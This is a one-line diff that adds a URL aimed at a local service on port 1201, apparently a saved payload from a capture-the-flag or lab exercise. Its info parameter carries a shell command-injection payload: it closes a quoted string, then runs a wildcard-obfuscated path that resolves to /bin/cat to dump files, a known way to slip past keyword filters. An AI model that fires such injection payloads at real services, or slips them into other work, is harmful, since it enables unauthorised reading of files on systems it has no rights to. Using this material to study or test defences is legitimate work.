@@ -1,0 +1,1 @@
+http://localhost:1201/?cmd=custom&info=%22;/??n/c?t%20/*;echo%20%22
